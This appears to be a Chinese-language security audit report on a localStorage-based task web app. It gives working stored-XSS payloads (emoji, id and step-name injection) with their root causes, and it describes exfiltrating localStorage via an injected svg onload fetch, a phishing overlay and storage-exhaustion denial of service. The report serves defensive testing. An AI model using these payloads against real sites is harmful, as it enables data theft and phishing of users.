## 🔴 第一部分：安全攻击报告

### 5个攻击方案全部成功！

#### 攻击1: XSS — flow.emoji 存储型注入 ⚠️ CRITICAL

**实测Payload：**
```javascript
localStorage.setItem('procrastination-launcher', JSON.stringify({
  flows: [{ id: 'f_test', name: '正常流程',
    emoji: '<img src=x onerror=alert("XSS by emoji")>',
    steps: [{name: '步骤1', time: ''}]
  }], history: [], todayCompleted: [], streak: 0, lastActiveDate: null
}));
// 刷新页面 → alert弹出 ✅
```

**根因**：emoji字段（行1856）未经`escapeHtml()`直接插入`innerHTML`。

---

#### 攻击2: XSS — flow.id 注入onclick处理器 ⚠️ CRITICAL

**实测Payload：**
```javascript
// 设置 flow.id = "');alert('XSS');//"
// 点击该流程的任意按钮 → 闭合onclick → alert弹出 ✅
```

**根因**：flow.id（行1865-1869）在`onclick="startFlow('${flow.id}')"`中未做任何过滤。

---

#### 攻击3: XSS — step.name 属性注入 ⚠️ CRITICAL

**实测Payload：**
```javascript
// 设置 step.name = '" onfocus="alert(\'XSS\')" autofocus="'
// escapeHtml()不转义引号 → 闭合value属性 → onfocus触发 ✅
```

**根因**：`escapeHtml()`函数不转义引号，在`value="${...}"`属性中使用时不安全。

---

#### 攻击4: localStorage 数据投毒

**全部成功** ✅
- 伪造打卡天数 → `data.streak = 99999` → 页面显示99999天连续打卡
- 窃取全部用户数据 → 注入`<svg onload=fetch(...)>` → 所有localStorage编码后外传
- UI钓鱼覆盖 → 注入完整CSS+HTML覆盖原界面 → 伪造"安全验证"页面

---

#### 攻击5: 拒绝服务

**全部成功** ✅
- 存储空间耗尽 → 50000个超长流程→localStorage溢出→正常saveState()失败
- 浏览器内存耗尽 → JSON.parse(5GB数据) → 浏览器卡死崩溃
